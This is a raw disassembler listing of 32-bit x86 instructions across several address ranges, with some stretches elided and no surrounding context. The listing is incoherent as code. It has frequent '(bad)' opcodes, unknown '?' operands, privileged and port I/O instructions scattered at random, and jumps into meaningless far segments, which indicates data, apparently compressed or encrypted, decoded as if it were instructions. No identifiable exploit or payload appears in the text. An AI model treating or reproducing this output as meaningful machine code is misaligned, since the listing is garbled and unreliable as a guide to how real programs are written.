  414a96:	or     DWORD PTR [eax+0x424c0ccf],0xffffffed
  414a9d:	sub    BYTE PTR [edx+0x28],cl
  414aa0:	cwde   
  414aa1:	addr16 out dx,al
  414aa3:	inc    edx
  414aa4:	aad    0x7b
  414aa6:	mov    esi,0xa8df5d8
  414aab:	or     bh,BYTE PTR [eax]
  414aad:	lods   eax,DWORD PTR ds:[esi]
  414aae:	push   ebx
  414aaf:	pop    edi
  414ab0:	pop    edx
  414ab1:	out    0x71,al
  414ab3:	outs   dx,BYTE PTR ds:[esi]
  414ab4:	or     dh,ch
  414ab6:	pushf  
  414ab7:	add    ecx,ebp
  414ab9:	mov    edx,0xfb73c625
  414abe:	or     dh,ch
  414ac0:	add    DWORD PTR cs:[edi+eiz*4+0x61],ebp
  414ac5:	sahf   
  414ac6:	fcomi  st,st(4)
  414ac8:	xchg   edi,eax
  414ac9:	jns    0x414ab3
  414acb:	mov    al,0xda
  414acd:	lea    eax,[edi]
  414acf:	ja     0x414b27
  414ad1:	jmp    0x414b2a
  414ad3:	xchg   edx,eax
  414ad4:	daa    
  414ad5:	push   ebx
  414ad6:	and    al,0xe9
  414ad8:	in     al,dx
  414ad9:	jge    0x414a93
  414adb:	mov    esp,0xf3c999e
  414ae0:	pusha  
  414ae1:	test   DWORD PTR [ebx+edi*4],esp
  414ae4:	cs lock mov dh,0x6c
  414ae8:	and    eax,0x42016586
	...
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [edi+0x5f73a6b0],bx
  414b67:	fild   WORD PTR [eax]
  414b69:	add    bh,bh
  414b6b:	add    BYTE PTR [eax],al
  414b6d:	add    BYTE PTR [ebx-0x75a44509],bl
  414b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b74:	and    edx,DWORD PTR [eax-0x2f2da6ad]
  414b7a:	add    dh,BYTE PTR [edi-0x3b]
  414b7d:	loopne 0x414bf5
  414b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b80:	jns    0x414b86
  414b82:	dec    ecx
  414b83:	outs   dx,DWORD PTR ds:[esi]
  414b84:	inc    edx
  414b85:	mov    bh,0xa
  414b87:	mov    dh,0xd0
  414b89:	mov    ebp,0xcc42586a
  414b8e:	rol    DWORD PTR [ebp-0x10],0x4e
  414b92:	adc    DWORD PTR [edi+edx*1-0x5a],0x51526a97
  414b9a:	mov    ch,0x1e
  414b9c:	sar    BYTE PTR [edi+edx*1-0x3a939dfe],0xa8
  414ba4:	std    
  414ba5:	mov    esi,?
  414ba7:	push   ds
  414ba8:	adc    eax,0x3d90f142
  414bad:	fs push ebx
  414baf:	test   DWORD PTR [ecx],eax
  414bb1:	imul   esi,DWORD PTR [edx+0x5c],0xffffffd0
  414bb5:	(bad)  
  414bb6:	je     0x414bf2
  414bb8:	cmovb  edx,DWORD PTR [eax-0x6d828288]
  414bbf:	adc    DWORD PTR [ecx-0x6896d27e],0x2b27117d
  414bc9:	popa   
  414bca:	(bad)  
  414bcb:	mov    esi,0x65c09e20
  414bd0:	adc    BYTE PTR [ebx],ch
  414bd2:	lock xchg ecx,eax
  414bd4:	ror    DWORD PTR [edx],1
  414bd6:	mov    ebx,0xda0d089b
  414bdb:	cbw    
  414bdd:	dec    eax
  414bde:	loopne 0x414b95
  414be0:	dec    esp
  414be1:	pop    ds
  414be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414be3:	fistp  DWORD PTR [ebp-0x15]
  414be6:	in     eax,0xa7
  414be8:	sub    al,0x54
  414bea:	mov    esi,0xe6028b6c
  414bef:	cdq    
  414bf0:	and    BYTE PTR [edi-0x4c],ch
  414bf3:	fs and eax,0xf1009e18
  414bf9:	mov    ch,0xe1
  414bfb:	or     eax,0xb2414cdd
  414c00:	mov    ah,0x34
  414c02:	cmp    DWORD PTR ss:[ebx-0x12],ebx
  414c06:	pop    eax
  414c07:	xor    eax,0x9cd317ee
  414c0c:	mov    eax,ds:0x7ec516f5
  414c11:	add    eax,0xf79c75e1
  414c16:	push   es
  414c17:	into   
  414c18:	xchg   edi,eax
  414c19:	repz cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414c1c:	fcom   DWORD PTR [edi+0x67]
  414c1f:	icebp  
  414c20:	in     eax,dx
  414c21:	iret   
  414c22:	clc    
  414c23:	push   es
  414c24:	sbb    eax,0xe0ee3662
  414c29:	jne    0x414c02
  414c2b:	or     al,0x17
  414c2d:	jmp    0x414c86
  414c2f:	xor    al,0x24
  414c31:	add    al,0xcb
  414c33:	mov    ecx,0x88b5f158
  414c38:	test   dh,ah
  414c3a:	ss icebp 
  414c3c:	mov    edi,0x836afb5
  414c41:	adc    DWORD PTR [ecx],0x38
  414c44:	lahf   
  414c45:	mov    ds:0xe500c33,eax
  414c4a:	jge    0x414c55
  414c4c:	push   cs
  414c4d:	les    edi,FWORD PTR [ebp-0x497bb9eb]
  414c53:	call   DWORD PTR [ecx+0x4]
  414c56:	add    al,0xe4
  414c58:	xchg   dh,al
  414c5a:	lea    ebp,[edi-0x35]
  414c5d:	adc    BYTE PTR [edx+ecx*4-0x9a128be],0xff
  414c65:	inc    ebp
  414c66:	ja     0x414c91
  414c68:	xchg   edi,eax
  414c69:	mov    dl,0x13
  414c6b:	aas    
  414c6c:	push   ebp
	...
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    esi,DWORD PTR cs:[eax-0x1e]
  414ce4:	dec    eax
  414ce5:	pop    ebp
  414ce6:	pop    esi
  414ce7:	loopne 0x414ce9
  414ce9:	add    bh,bh
  414ceb:	add    BYTE PTR [eax],al
  414ced:	add    BYTE PTR [ebp+edi*8+0x342dfa48],al
  414cf4:	dec    ebp
  414cf5:	fimul  DWORD PTR [ecx+0x47370c60]
  414cfb:	out    dx,eax
  414cfc:	xor    bl,bh
  414cfe:	add    al,0xe4
  414d00:	fidivr DWORD PTR [eax-0x30]
  414d03:	push   ebx
  414d04:	call   0x7d56:0x61e87bbf
  414d0b:	push   eax
  414d0c:	dec    ecx
  414d0d:	xchg   BYTE PTR [eax-0x2f843378],bh
  414d13:	push   cs
  414d14:	dec    ebp
  414d15:	jb     0x414cf7
  414d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d18:	mov    eax,ds:0x4ca21d8d
  414d1d:	dec    ecx
  414d1e:	out    dx,eax
  414d1f:	xchg   BYTE PTR [ecx+0xf2d68b4],al
  414d25:	test   DWORD PTR [esi],ecx
  414d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d29:	ins    BYTE PTR es:[edi],dx
  414d2a:	fisttp WORD PTR [eax+0x1d]
  414d2d:	or     ah,cl
  414d2f:	(bad)
  414d32:	lods   al,BYTE PTR ds:[esi]
  414d33:	jmp    0x414d8a
  414d35:	jecxz  0x414d42
  414d37:	cmp    DWORD PTR [eax-0x2],0xffffffe8
  414d3b:	pop    ecx
  414d3c:	cmp    al,0xe7
  414d3e:	inc    esi
  414d3f:	nop
  414d40:	test   bh,0x8e
  414d43:	in     eax,dx
  414d44:	xor    bl,BYTE PTR [edx-0x51]
  414d47:	mov    al,ds:0x1760010c
  414d4c:	push   ebx
  414d4d:	sub    eax,0x4e4fba1c
  414d52:	stos   BYTE PTR es:[edi],al
  414d53:	outs   dx,DWORD PTR ds:[esi]
  414d54:	fwait
  414d55:	cmp    eax,0x27ca0255
  414d5a:	mov    bl,0x98
  414d5c:	xchg   edx,eax
  414d5d:	int    0x5e
  414d5f:	push   ebp
  414d60:	div    DWORD PTR [ebx]
  414d62:	xor    bl,dh
  414d64:	loop   0x414d6d
  414d66:	std    
  414d67:	xor    ah,ch
  414d69:	xor    ecx,DWORD PTR [esi+0x39f8bd42]
  414d6f:	(bad)  
  414d70:	sar    BYTE PTR [ebx+0x5d],0xcb
  414d74:	fnstenv [edx-0x4c3e7d4b]
  414d7a:	sub    ebp,DWORD PTR [eax]
  414d7c:	push   esi
  414d7d:	mov    esi,0x8c21c20e
  414d82:	das    
  414d83:	data16 jbe 0x414d80
  414d86:	jmp    0xd2b93aff
  414d8b:	or     DWORD PTR [ebx],eax
  414d8d:	jb     0x414def
  414d8f:	jnp    0x414d48
  414d91:	(bad)  
  414d92:	imul   edi,DWORD PTR [edx-0x7e5a4cf8],0x9
  414d99:	cmovp  ebp,DWORD PTR [edx-0x72238a17]
  414da0:	int    0x22
  414da2:	or     esp,edx
  414da4:	ins    BYTE PTR es:[edi],dx
  414da5:	popf   
  414da6:	or     al,0xb3
  414da8:	jecxz  0x414d57
  414daa:	or     DWORD PTR [edi],ebx
  414dac:	fmul   QWORD PTR [ecx]
  414dae:	leave  
  414daf:	or     ch,BYTE PTR [edi+0x531ef0fb]
  414db5:	cli    
  414db6:	mov    ah,BYTE PTR [ebx-0x7c89ac6d]
  414dbc:	lods   al,BYTE PTR ds:[esi]
  414dbd:	and    BYTE PTR [ecx],bl
  414dbf:	aad    0x83
  414dc1:	stc    
  414dc2:	lock fsubp st(5),st
  414dc5:	inc    ebx
  414dc6:	adc    DWORD PTR [ecx+edi*1+0x5ae238f5],esp
  414dcd:	sti    
  414dce:	inc    eax
  414dcf:	jmp    0x414d6f
  414dd1:	xor    esp,0x2f
  414dd4:	adc    eax,0xe6b7ccb8
  414dd9:	or     dl,dh
  414ddb:	shl    DWORD PTR [edi-0x12],1
  414dde:	mov    ecx,0x8f8330dd
  414de3:	and    dh,ah
  414de5:	fs pushf 
  414de7:	sbb    DWORD PTR [edi+0x38],esp
  414dea:	lahf   
  414deb:	dec    eax
  414dec:	bound  eax,QWORD PTR [eax]
	...
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x7f32803a
  414e66:	pop    ebp
  414e67:	loope  0x414e69
  414e69:	add    bh,bh
  414e6b:	add    BYTE PTR [eax],al
  414e6d:	add    bl,dl
  414e6f:	inc    edi
  414e70:	retf   
  414e71:	imul   esp,edx,0x51c1cd59
  414e77:	adc    al,0xac
  414e79:	mov    eax,0x4d257c02
  414e7e:	aam    0x9e
  414e80:	f2xm1  
  414e82:	jg     0x414e55
  414e84:	mov    eax,ds
  414e86:	pop    ebp
  414e87:	cli    
  414e88:	(bad)  
  414e8a:	not    BYTE PTR [ecx-0x74]
  414e8d:	push   ebx
  414e8e:	fs xchg esp,eax
  414e90:	cs ins DWORD PTR es:[edi],dx
  414e92:	out    0xf0,al
  414e94:	sbb    ebp,DWORD PTR [ebp-0x46]
  414e97:	xor    edx,ecx
  414e99:	push   0x2ac5b0fc
  414e9e:	sbb    al,ah
  414ea0:	sbb    DWORD PTR [ebp-0x74],eax
  414ea3:	ds cli 
  414ea5:	or     eax,0x3a9c9c2e
  414eaa:	js     0x414f0e
  414eac:	nop
  414ead:	retf   0x80be
  414eb0:	stc    
  414eb1:	imul   edx,esp,0xffffffba
  414eb4:	xor    eax,ebp
  414eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eb7:	mov    ecx,0xf11ac9ab
  414ebc:	or     ch,BYTE PTR [ecx]
  414ebe:	pop    edi
  414ebf:	nop
  414ec0:	pop    esp
  414ec1:	sbb    eax,0xce9627a
  414ec6:	add    BYTE PTR [esi+ebx*1+0x1fa899a0],dh
  414ecd:	jge    0x414e9b
  414ecf:	fnstenv [esi]
  414ed1:	push   eax
  414ed2:	adc    dh,ch
  414ed4:	ss adc eax,0xc2254e1f
  414eda:	fucomp st(3)
  414edc:	mov    eax,ds:0x690b0a6f
  414ee1:	jmp    FWORD PTR [esi+0x7f]
  414ee4:	xor    BYTE PTR [ebp+eax*2+0x8],ah
  414ee8:	xchg   ebp,eax
  414ee9:	pushf  
  414eea:	push   eax
  414eeb:	dec    ecx
  414eec:	pusha  
  414eed:	jne    0x414e93
  414eef:	mul    esi
  414ef1:	dec    edx
  414ef2:	mov    esp,edx
  414ef4:	push   cs
  414ef5:	mov    ss,eax
  414ef7:	(bad)  
  414ef8:	adc    esi,DWORD PTR [edx]
  414efa:	or     bl,BYTE PTR [esi]
  414efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414efd:	jge    0x414ee2
  414eff:	imul   eax,DWORD PTR [edx],0xdf121964
  414f05:	sub    dl,cl
  414f07:	jmp    0x9184f093
  414f0c:	inc    ebx
  414f0d:	in     al,0xe8
  414f0f:	jmp    0xc6a2c53b
  414f14:	addr16 mov dh,0x33
  414f17:	fwait
  414f18:	sub    BYTE PTR [ebx+ecx*4+0x69f53291],cl
  414f1f:	fsubr  QWORD PTR ds:0xa48850e1
  414f25:	loopne 0x414f7e
  414f27:	push   edx
  414f28:	sar    BYTE PTR ds:0xa56476f1,cl
  414f2e:	test   al,0x5d
  414f30:	das    
  414f31:	sub    dh,dl
  414f33:	xchg   DWORD PTR [eax+0x58],ebx
  414f36:	pop    ebp
  414f37:	push   es
  414f38:	inc    ebp
  414f39:	sbb    BYTE PTR [ebp-0x73001341],bl
  414f3f:	mov    ?,WORD PTR [edi]
  414f41:	inc    ebp
  414f42:	pop    edx
  414f43:	adc    al,0x73
  414f45:	not    BYTE PTR [esp+ecx*1+0x65]
  414f49:	leave  
  414f4a:	fsub   st(2),st
  414f4c:	push   0x17966f96
  414f51:	pushf  
  414f52:	add    eax,0x86456962
  414f57:	lods   al,BYTE PTR ds:[esi]
  414f58:	inc    ecx
  414f59:	lock repnz sub bl,ch
  414f5d:	xor    BYTE PTR [ebx],ch
  414f5f:	int3   
  414f60:	dec    esi
  414f61:	inc    eax
  414f62:	xchg   edx,eax
  414f63:	xchg   esp,eax
  414f64:	cld    
  414f65:	mov    ecx,0x8f9a06c9
  414f6a:	repz push cs
  414f6c:	cmp    BYTE PTR [eax],al
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe25c:0x72018835
  414fe8:	add    BYTE PTR [eax],al
  414fea:	inc    DWORD PTR [eax]
  414fec:	add    BYTE PTR [eax],al
  414fee:	rol    DWORD PTR [eax-0x433bd682],cl
  414ff4:	aad    0xd5
  414ff6:	sbb    DWORD PTR [eax+0x79eddf3c],esi
  414ffc:	or     eax,0xf0044941
  415001:	mov    DWORD PTR [edx+0x4e0ec7f6],edx
  415007:	pushf  
  415008:	add    al,0xae
  41500a:	fisub  WORD PTR [edi]
  41500c:	jmp    0x5598d28e
  415011:	sahf   
  415012:	shl    DWORD PTR [esi+0x7d8a3adf],cl
  415018:	xchg   ecx,eax
  415019:	mov    edi,0x2c930523
  41501e:	ja     0x414fc2
  415020:	adc    BYTE PTR [esi],bl
  415022:	sub    BYTE PTR [edx],al
  415024:	dec    edi
  415025:	pop    esi
  415026:	pop    edx
  415027:	mov    dl,0x8e
  415029:	push   esp
  41502a:	retf   
  41502b:	dec    edi
  41502c:	fnstcw WORD PTR [edx+0x6d]
  41502f:	sti    
  415030:	adc    eax,esi
  415032:	sahf   
  415033:	adc    BYTE PTR [edx-0x34],dh
  415036:	sti    
  415037:	mov    WORD PTR [ebx+0x4b0be2fb],cs
  41503d:	lea    ecx,[edx-0x2b]
  415040:	and    al,0xff
  415042:	inc    edi
  415043:	xor    esi,DWORD PTR ds:0xd8656940
  415049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41504a:	stos   BYTE PTR es:[edi],al
  41504b:	adc    eax,0x541b413f
  415050:	stc    
  415051:	pop    es
  415052:	test   al,0x1d
  415054:	mov    al,ds:0xec794faf
  415059:	cmp    BYTE PTR [edx-0xc],al
  41505c:	pop    ebx
  41505d:	sti    
  41505e:	hlt    
  41505f:	jmp    0x5cad:0x506eceb7
  415066:	xchg   edx,eax
  415067:	jg     0x41504a
  415069:	pop    esp
  41506a:	xchg   ch,bl
  41506c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506d:	mov    DWORD PTR [ebx-0x3],eax
  415070:	fs fwait
  415072:	mov    dl,0x66
  415074:	sahf   
  415075:	jmp    0xb99d707f
  41507a:	pusha  
  41507b:	adc    al,0x6e
  41507d:	sar    BYTE PTR [eax+edi*4-0x1125534b],cl
  415084:	mov    ebx,0xd2c03d9b
  415089:	mov    ah,al
  41508b:	lods   al,BYTE PTR ds:[esi]
  41508c:	mov    cl,0xf1
  41508e:	inc    eax
  41508f:	dec    ecx
  415090:	dec    edi
  415091:	adc    ebx,DWORD PTR [ebx]
  415093:	pop    esi
  415094:	cmp    bh,dl
  415096:	(bad)  
  415097:	mov    edi,0xe0bbf3e3
  41509c:	jo     0x4150a1
  41509e:	loop   0x41508c
  4150a0:	push   eax
  4150a1:	or     BYTE PTR [edx],bh
  4150a3:	jb     0x415078
  4150a5:	cli    
  4150a6:	add    eax,0x61ad7c31
  4150ab:	cwde   
  4150ac:	cdq    
  4150ad:	mov    cl,0xcc
  4150af:	fwait
  4150b0:	mov    edi,0x7642eb5c
  4150b5:	data16 (bad) 
  4150b7:	loope  0x41509e
  4150b9:	adc    eax,0xe09dffe8
  4150be:	dec    edi
  4150bf:	xchg   DWORD PTR [edi],edi
  4150c1:	adc    al,0x4d
  4150c3:	sbb    eax,0x17635baf
  4150c8:	add    eax,0xd3a64bab
  4150cd:	rcl    BYTE PTR [esi],0xdd
  4150d0:	repnz add al,0x1d
  4150d3:	dec    ebx
  4150d4:	cmp    edx,DWORD PTR [ebx-0xb]
  4150d7:	mov    ebx,0x2f0117fa
  4150dc:	cmp    ecx,ecx
  4150de:	lods   al,BYTE PTR ds:[esi]
  4150df:	mov    bh,0xec
  4150e1:	inc    eax
  4150e2:	push   es
  4150e3:	inc    esp
  4150e4:	pop    ecx
  4150e5:	enter  0xe09e,0xd9
  4150e9:	jge    0x415112
  4150eb:	and    eax,0x75
	...
  415154:	add    BYTE PTR [eax],al
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x84b9fc2d
  415164:	imul   eax,DWORD PTR [ebx+ebx*2-0x1d],0x0
  415169:	add    bh,bh
  41516b:	add    BYTE PTR [eax],al
  41516d:	add    BYTE PTR [edi-0x2b],al
  415170:	aas    
  415171:	test   eax,0x24346fca
  415176:	or     eax,0x85e4bd9d
  41517b:	sbb    BYTE PTR fs:[eax-0x20],ah
  41517f:	dec    esp
  415180:	push   edi
  415181:	mov    ebp,0xe1d2f488
  415186:	aaa    
  415187:	fwait
  415188:	xor    edx,DWORD PTR [eax]
  41518a:	fimul  WORD PTR [eax+ebx*4]
  41518d:	sbb    al,0xbe
  41518f:	sti    
  415190:	add    BYTE PTR [esi+0x78],bl
  415193:	sbb    esp,DWORD PTR [eax+0x28b015ea]
  415199:	xchg   ecx,eax
  41519a:	sahf   
  41519b:	xlat   BYTE PTR ds:[ebx]
  41519c:	outs   dx,DWORD PTR ds:[esi]
  41519d:	retf   0x5762
  4151a0:	rol    BYTE PTR [ecx-0x43f50750],1
  4151a6:	mov    ebx,0x2dfbfa7c
  4151ab:	jl     0x4151c7
  4151ad:	jmp    0x7eda17b7
  4151b2:	xchg   DWORD PTR [eax+0x69],ebp
  4151b5:	outs   dx,BYTE PTR ds:[esi]
  4151b6:	loop   0x415205
  4151b8:	pushf  
  4151b9:	push   ss
  4151ba:	xor    DWORD PTR [ecx],esp
  4151bc:	push   0x1e
  4151be:	xor    al,BYTE PTR [ebx]
  4151c0:	fsub   QWORD PTR [ebp+ebx*4-0x34dc8b51]
  4151c7:	adc    BYTE PTR [ebp+ebx*8+0x3245eed2],ch
  4151ce:	das    
  4151cf:	outs   dx,DWORD PTR ds:[si]
  4151d1:	add    al,0x5d
  4151d3:	dec    esp
  4151d4:	mov    eax,ds:0x5457fc0
  4151d9:	iret   
  4151da:	xchg   BYTE PTR [eax-0x25],dh
  4151dd:	iret   
  4151de:	dec    eax
  4151df:	(bad)  
  4151e0:	jmp    0x415258
  4151e2:	inc    edx
  4151e3:	in     al,0xb2
  4151e5:	lea    esp,[eax]
  4151e7:	mov    cl,0xf3
  4151e9:	mov    dl,0xd2
  4151eb:	sti    
  4151ec:	aaa    
  4151ed:	mov    dl,al
  4151ef:	pop    edi
  4151f0:	cmp    esp,DWORD PTR [edx+0x5fa97417]
  4151f6:	fst    DWORD PTR [esp+eiz*8]
  4151f9:	ds sub al,0x93
  4151fc:	mov    bl,0xf5
  4151fe:	jne    0x415254
  415200:	mov    ah,0xcc
  415202:	mov    eax,0x32f2928a
  415207:	ret    
  415208:	loope  0x4151fd
  41520a:	cmp    al,0xf4
  41520c:	jbe    0x415237
  41520e:	hlt    
  41520f:	adc    al,0x1d
  415211:	and    BYTE PTR [edi+0x44],al
  415214:	mov    edx,0xf632c9b7
  415219:	jl     0x41523e
  41521b:	lods   eax,DWORD PTR ds:[esi]
  41521c:	repnz out dx,eax
  41521e:	iret   
  41521f:	mov    esp,ecx
  415221:	jp     0x4151d3
  415223:	cmp    DWORD PTR [edi],edx
  415225:	adc    edx,DWORD PTR [ecx+esi*8+0x1c]
  415229:	and    BYTE PTR [esp+esi*8-0x4fd88230],bh
  415230:	mov    ebx,0x6a691de
  415235:	xchg   esp,eax
  415236:	sahf   
  415237:	imul   ecx,DWORD PTR [esi-0x41839c1b],0xb26a89db
  415241:	(bad)  
  415242:	fstp   DWORD PTR [esi]
  415244:	js     0x415275
  415246:	gs xchg edi,eax
  415248:	jb     0x415250
  41524a:	pop    es
  41524b:	sbb    BYTE PTR [esp+eax*8-0x7f],cl
  41524f:	lahf   
  415250:	sub    bh,cl
  415252:	and    al,0xfc
  415254:	or     dl,BYTE PTR [ebx]
  415256:	sub    al,ah
  415258:	lods   al,BYTE PTR ds:[esi]
  415259:	fild   DWORD PTR [ebp+0x2a]
  41525c:	mov    WORD PTR [esi-0x7e],?
  41525f:	cmc    
  415260:	clc    
  415261:	lahf   
  415262:	ror    BYTE PTR [ecx-0x47e12d20],1
  415268:	pop    ebp
  415269:	push   ds
  41526a:	push   es
  41526b:	ffreep st(2)
	...
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x9901670b
  4152e5:	jae    0x415341
  4152e7:	in     al,0x0
  4152e9:	add    bh,bh
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	add    bh,dl
  4152ef:	loope  0x41534e
  4152f1:	stos   DWORD PTR es:[edi],eax
  4152f2:	int3   
  4152f3:	mov    dh,0xbb
  4152f5:	add    al,0x5b
  4152f7:	not    DWORD PTR [esp+edx*4]
  4152fa:	push   0x5dd5d9f7
  4152ff:	out    0x6b,al
  415301:	jmp    0x82a2884b
  415306:	xor    cl,BYTE PTR [edx+ebx*4]
  415309:	jbe    0x415373
  41530b:	std    
  41530c:	dec    ebx
  41530d:	ss fwait
  41530f:	sub    BYTE PTR [edx+0x1c],ah
  415312:	fdivr  DWORD PTR [edi+0x3e]
  415315:	jae    0x415317
  415317:	cwde   
  415318:	adc    al,0xde
  41531a:	jg     0x415357
  41531c:	xor    al,0xd4
  41531e:	inc    edx
  41531f:	scas   al,BYTE PTR es:[edi]
  415320:	add    al,cl
  415322:	mov    ds:0xa95ea245,al
  415327:	mov    WORD PTR [edx-0x74],ds
  41532a:	test   al,0x49
  41532c:	mov    bx,0x7485
  415330:	push   ss
  415331:	rcl    DWORD PTR [ebx+0x8],0x38
  415335:	pop    es
  415336:	xor    eax,0xcd4fdca4
  41533b:	jecxz  0x4152e7
  41533d:	sub    edx,DWORD PTR [esi+0x3578b984]
  415343:	int    0xa2
  415345:	jnp    0x415326
  415347:	or     DWORD PTR [ecx],0xffffffcb
  41534a:	add    ebx,esp
  41534c:	fnstcw WORD PTR [edx-0x25]
  41534f:	je     0x4152e8
  415351:	lds    edi,FWORD PTR [eax+ebx*4-0x40634be]
  415358:	call   0x2fac:0x1504dd7c
  41535f:	add    BYTE PTR [eax],al
  415361:	dec    esp
  415362:	repz push ecx
  415364:	test   eax,0x9cd5e307
  415369:	adc    cl,BYTE PTR [ecx+edx*4]
  41536c:	sub    dl,cl
  41536e:	data16 rol BYTE PTR [eax+eiz*8+0x36],cl
  415373:	cmc    
  415374:	ret    
  415375:	push   edx
  415376:	xchg   edx,eax
  415377:	xchg   bl,dl
  415379:	(bad)  ds:0xdd6196dd
  41537f:	retf   
  415380:	lods   eax,DWORD PTR ds:[esi]
  415381:	add    DWORD PTR [ebx-0x49f30c8],ecx
  415387:	(bad)  
  415388:	push   ecx
  415389:	repz cmc 
  41538b:	aad    0x43
  41538d:	mov    eax,0x429d4fd4
  415392:	iret   
  415393:	adc    eax,0x4e63ec7
  415398:	out    dx,al
  415399:	imul   ecx,DWORD PTR [edi],0xfad943ec
  41539f:	push   0x33a8e10a
  4153a4:	sar    al,1
  4153a6:	lahf   
  4153a7:	lahf   
  4153a8:	mov    esi,0x3b612183
  4153ad:	inc    esp
  4153ae:	and    ch,BYTE PTR [esp+ebx*4+0x4342aa84]
  4153b5:	mov    BYTE PTR [esi+0x438529ea],dh
  4153bb:	das    
  4153bc:	adc    eax,0x6ae58831
  4153c1:	stos   DWORD PTR es:[edi],eax
  4153c2:	or     eax,0x14c6237c
  4153c7:	mov    ecx,cs
  4153c9:	sub    eax,0x80db7d8
  4153cf:	push   cs
  4153d0:	add    ebx,DWORD PTR [eax]
  4153d2:	(bad)
  4153d6:	mov    ah,BYTE PTR [ecx]
  4153d8:	xchg   ebp,eax
  4153d9:	and    al,0xeb
  4153db:	lds    ebp,FWORD PTR [ebx-0x3bc78f14]
  4153e1:	ds xchg ebp,eax
  4153e3:	push   eax
  4153e4:	add    esi,edi
  4153e6:	dec    edi
  4153e7:	cmp    BYTE PTR [edx+0x678086fd],0x0
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xf3d3e5b0
  415463:	mov    esi,0xe55984c4
  415468:	add    BYTE PTR [eax],al
  41546a:	inc    DWORD PTR [eax]
  41546c:	add    BYTE PTR [eax],al
  41546e:	test   al,bl
  415470:	leave  
  415471:	adc    BYTE PTR [esi+eax*4],0x9a
  415475:	pop    eax
  415476:	mov    ebx,0xd0adf19a
  41547b:	dec    edi
  41547c:	pop    ebx
  41547d:	mov    ebx,DWORD PTR [eax]
  41547f:	sub    eax,0x1cf630f3
  415484:	sub    al,0xf9
  415486:	ror    DWORD PTR [ebx-0x6162a12],cl
  41548c:	push   ebp
  41548d:	xor    BYTE PTR [ebp-0x2e],cl
  415490:	lock sub ebp,DWORD PTR [ecx+0x65]
  415494:	or     ah,BYTE PTR [esi+edi*8]
  415497:	pop    ebp
  415498:	adc    ebp,ebp
  41549a:	dec    esp
  41549b:	(bad)  
  41549c:	mov    esi,0x984d6d58
  4154a1:	retf   0x4c7c
  4154a4:	push   edi
  4154a5:	pop    ds
  4154a6:	hlt    
  4154a7:	aad    0xa6
  4154a9:	test   BYTE PTR [ebp+ebx*2-0x44],bl
  4154ad:	add    DWORD PTR [eax-0x2e],0x32
  4154b1:	cmp    eax,0x45ff07d0
  4154b6:	add    eax,0x65a82e31
  4154bb:	fsub   DWORD PTR [ebp-0x12761eb9]
  4154c1:	(bad)  
  4154c2:	ja     0x41548e
  4154c4:	push   eax
  4154c5:	xchg   BYTE PTR [ecx],bh
  4154c7:	mov    eax,0xef0c4aaf
  4154cc:	push   ebp
  4154cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ce:	push   es
  4154cf:	lods   al,BYTE PTR ds:[esi]
  4154d0:	cmc    
  4154d1:	and    bh,BYTE PTR [ecx+0x17744b86]
  4154d7:	mov    eax,ds:0xc65b0665
  4154dc:	push   esi
  4154dd:	mov    dl,0xc8
  4154df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e0:	aam    0xbc
  4154e2:	jns    0x415534
  4154e4:	or     ecx,DWORD PTR [ebp-0x4b]
  4154e7:	mov    ch,0xa6
  4154e9:	les    esi,FWORD PTR [ecx+0x63c65c32]
  4154ef:	push   esp
  4154f0:	mov    DWORD PTR [edx+0x6b22b2b0],0xa4ae9639
  4154fa:	out    0xec,al
  4154fc:	push   eax
  4154fd:	das    
  4154fe:	call   0x822e:0x5cffdf71
  415505:	cs mov ebp,0x316dff5c
  41550b:	add    DWORD PTR [ebx+0x1135e169],ecx
  415511:	fldcw  WORD PTR ds:0x24d8bc30
  415517:	xor    eax,0xe7f84629
  41551c:	and    DWORD PTR [edx],edi
  41551e:	inc    ebx
  41551f:	mov    esi,0x182e2034
  415524:	stos   BYTE PTR es:[edi],al
  415525:	jp     0x41558f
  415527:	scas   eax,DWORD PTR es:[edi]
  415528:	push   0x79bed66a
  41552d:	inc    esi
  41552e:	jmp    0x4154d5
  415530:	loopne 0x415588
  415532:	shl    BYTE PTR [esi+eax*4-0x73],cl
  415536:	pop    ds
  415537:	out    dx,al
  415538:	stos   DWORD PTR es:[edi],eax
  415539:	lods   al,BYTE PTR ds:[esi]
  41553a:	enter  0xd141,0x94
  41553e:	xchg   BYTE PTR [eax],al
  415540:	jno    0x415545
  415542:	mov    eax,ds:0x49b7b42e
  415547:	icebp  
  415548:	mov    edx,0x2c7d6bff
